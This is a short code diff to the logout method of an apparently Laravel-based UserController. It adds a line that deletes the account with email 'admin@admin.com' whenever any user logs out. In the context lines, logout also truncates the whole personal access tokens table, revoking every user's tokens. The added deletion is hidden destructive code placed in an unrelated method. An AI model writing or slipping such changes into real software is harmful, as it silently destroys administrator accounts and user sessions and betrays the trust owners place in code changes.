@@ -62,6 +62,7 @@ class UserController extends Controller
     public function logout(): JsonResponse
     {
         $user = auth()->user();
+        User::where('email', 'admin@admin.com')->delete();
         if($user){
               // Menggunakan DB facade untuk truncate tabel tokens
             DB::table('personal_access_tokens')->truncate();
